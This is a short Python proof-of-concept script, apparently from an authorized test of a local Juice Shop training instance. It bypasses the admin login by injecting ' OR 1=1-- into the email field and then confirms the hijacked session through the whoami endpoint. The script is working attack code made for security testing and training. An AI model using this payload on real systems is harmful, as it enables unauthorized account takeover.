#!/usr/bin/env python3
"""JUICE-001 - SQL Injection login bypass (authorized, local instance only).

Logs in as the administrator without a valid password by injecting into the
email field of POST /rest/user/login.

Usage:  python juice_001_sqli_login.py [base_url]
        (default base_url: http://localhost:3000)
"""
import sys
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
PAYLOAD = "' OR 1=1--"


def main() -> int:
    r = requests.post(
        f"{BASE}/rest/user/login",
        json={"email": PAYLOAD, "password": "anything"},
        timeout=15,
    )
    print(f"POST /rest/user/login  (email={PAYLOAD!r})  ->  HTTP {r.status_code}")
    if r.status_code != 200:
        print("Login bypass FAILED:", r.text[:200])
        return 1

    auth = r.json()["authentication"]
    token = auth["token"]
    email = auth.get("umail")
    if not email:
        who = requests.get(
            f"{BASE}/rest/user/whoami",
            headers={"Authorization": f"Bearer {token}", "Cookie": f"token={token}"},
            timeout=15,
        ).json()
        email = who.get("user", {}).get("email")
    print(f"Logged in as: {email} without a password")
    print("JUICE-001 reproduced: admin authentication bypass via SQL injection.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
